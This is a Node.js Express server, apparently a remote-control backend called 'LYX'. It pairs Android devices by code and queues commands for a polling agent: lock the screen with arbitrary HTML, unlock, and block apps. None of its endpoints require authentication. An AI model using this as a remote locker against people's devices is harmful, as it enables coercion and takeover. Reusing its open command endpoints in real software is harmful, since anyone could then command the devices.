const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

let pairingCodes = {};
let devices = [];

app.post('/api/generate-pairing', (req, res) => {
  const { code } = req.body;
  if (!code) return res.json({ success: false });
  pairingCodes[code] = { used: false };
  res.json({ success: true, code });
});

app.post('/api/register-device', (req, res) => {
  const { code, name, model, os, type } = req.body;
  if (!pairingCodes[code]) return res.json({ success: false, message: 'Code invalid' });
  if (pairingCodes[code].used) return res.json({ success: false, message: 'Code used' });

  const d = {
    id: 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
    name: name || 'Unknown',
    model: model || 'Unknown',
    os: os || 'Unknown',
    type: type || 'android',
    commands: []
  };
  devices.push(d);
  pairingCodes[code].used = true;
  res.json({ success: true, deviceId: d.id });
});

app.get('/api/devices', (req, res) => {
  res.json(devices.map(d => ({ id: d.id, name: d.name, model: d.model, os: d.os, type: d.type })));
});

/* COMMAND ROUTE - semua command masuk sini */
app.post('/api/command', (req, res) => {
  const { deviceId, type, ...extra } = req.body;
  const d = devices.find(x => x.id === deviceId);
  if (!d) return res.json({ success: false });
  d.commands.push({ type, ...extra, id: Date.now() });
  res.json({ success: true });
});

/* Backward compat */
app.post('/api/lock', (req, res) => {
  const { deviceId, html, action } = req.body;
  const d = devices.find(x => x.id === deviceId);
  if (!d) return res.json({ success: false });
  d.commands.push(action === 'unlock' ? { type: 'unlock' } : { type: 'lock', html });
  res.json({ success: true });
});

app.post('/api/block-app', (req, res) => {
  const { deviceId, appName, message } = req.body;
  const d = devices.find(x => x.id === deviceId);
  if (!d) return res.json({ success: false });
  d.commands.push({ type: 'blockapp', appName, message });
  res.json({ success: true });
});

app.get('/api/agent/commands/:deviceId', (req, res) => {
  const d = devices.find(x => x.id === req.params.deviceId);
  if (!d) return res.json({ commands: [] });
  const cmds = [...d.commands];
  d.commands = [];
  res.json({ commands: cmds });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log('🔥 LYX SERVER PORT ' + PORT));
